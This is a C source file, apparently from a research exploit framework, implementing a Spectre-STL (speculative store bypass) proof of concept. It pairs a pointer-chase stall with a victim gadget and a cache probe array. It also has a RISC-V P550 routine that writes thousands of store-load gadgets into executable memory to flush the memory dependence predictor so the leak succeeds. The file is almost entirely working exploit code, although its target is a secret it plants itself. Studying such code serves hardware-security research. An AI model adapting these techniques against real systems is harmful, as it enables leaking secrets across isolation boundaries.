#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../exploit_framework.h"
#include <sys/mman.h>
#include <string.h>

// STL: store-to-load forwarding bypass

#define CHAIN_DEPTH 4  // Number of pointer chases for stall

unsigned char* memory_slot[256];

unsigned char secret_key[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
unsigned char public_key[] = "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA";

uint8_t* probe_array;
volatile uint8_t tmp = 0;

ptr_chase_chain_t* stall_chain;

// STL gadget: store-to-load forwarding bypass
uint8_t __attribute__((noinline)) victim_function(size_t idx) {
    unsigned char **memory_slot_slow_ptr = (unsigned char **)PTR_CHASE_N(stall_chain->start, CHAIN_DEPTH);
    *memory_slot_slow_ptr = public_key;
    SPEC_FENCE();
    maccess(probe_array + (*memory_slot)[idx] * PAGE_SIZE);
    return 0;
}

// --- MDP thrashing for P550 ---
// JIT many store-load pairs at unique PCs that alias on the same address.
// Each triggers an MDP violation, filling the MDP table and evicting
// our victim_function's entry so the load can race ahead speculatively.

#ifdef P550
#ifndef MDP_THRASH_COUNT
#define MDP_THRASH_COUNT 16384
#endif

// Each gadget: sd a1, 0(a0); ld a2, 0(a0); ret
// a0 = address to alias on, a1 = value to store
// The store-load pair will cause an ordering violation.
// We space gadgets apart so each has a unique PC for MDP indexing.
#define GADGET_STRIDE 64  // bytes between gadgets (ensure distinct cache lines)

static void* mdp_thrash_page;
static volatile uint64_t mdp_alias_slot;

static void mdp_thrash_init(void) {
    size_t size = MDP_THRASH_COUNT * GADGET_STRIDE;
    mdp_thrash_page = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mdp_thrash_page == MAP_FAILED) {
        perror("mmap mdp_thrash");
        exit(1);
    }

    // Emit gadgets: sd a1, 0(a0); ld a2, 0(a0); ret
    // RISC-V encodings:
    //   sd a1, 0(a0)  = 0x00b53023
    //   ld a2, 0(a0)  = 0x00053603
    //   ret            = 0x00008067
    uint32_t code[] = { 0x00b53023, 0x00053603, 0x00008067 };

    for (int i = 0; i < MDP_THRASH_COUNT; i++) {
        void* dest = (char*)mdp_thrash_page + i * GADGET_STRIDE;
        memcpy(dest, code, sizeof(code));
    }

    // fence.i to sync icache
    asm volatile("fence.i" ::: "memory");
}

static void mdp_thrash_cleanup(void) {
    if (mdp_thrash_page && mdp_thrash_page != MAP_FAILED)
        munmap(mdp_thrash_page, MDP_THRASH_COUNT * GADGET_STRIDE);
}

// Call all thrashing gadgets to fill MDP with bogus entries
static inline void mdp_thrash(void) {
    typedef void (*gadget_fn)(volatile uint64_t* addr, uint64_t val);
    for (int i = 0; i < MDP_THRASH_COUNT; i++) {
        gadget_fn fn = (gadget_fn)((char*)mdp_thrash_page + i * GADGET_STRIDE);
        fn(&mdp_alias_slot, 0x42);
    }
}
#endif // P550

void stl_setup(exploit_ctx_t* ctx, void* data) {
    ctx->exclude_enabled = true;
    ctx->exclude_value = 0xaa;

    stall_chain = ptr_chase_chain_create(CHAIN_DEPTH, memory_slot);
    if (!stall_chain) {
        fprintf(stderr, "Failed to create stall chain\n");
        exit(1);
    }

#ifdef P550
    mdp_thrash_init();
#endif
}

void stl_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    secret_key[0] = encode_index;
    *memory_slot = secret_key;

#ifdef P550
    // Thrash MDP to evict victim_function's entry
    mdp_thrash();
#endif

    ptr_chase_chain_evict(stall_chain);

    mfence();
    NO_OPT(victim_function(0));
    mfence();
}

void stl_cleanup(exploit_ctx_t* ctx, void* data) {
    ptr_chase_chain_destroy(stall_chain);
#ifdef P550
    mdp_thrash_cleanup();
#endif
}

int main() {
    exploit_ctx_t ctx = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-STL (chain_depth=%d)\n", CHAIN_DEPTH);
#ifdef P550
    printf("MDP thrash: %d gadgets\n", MDP_THRASH_COUNT);
#endif

    exploit_hooks_t hooks = {
        .setup = stl_setup,
        .attack = stl_attack,
        .cleanup = stl_cleanup
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("STL store-to-load forwarding", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
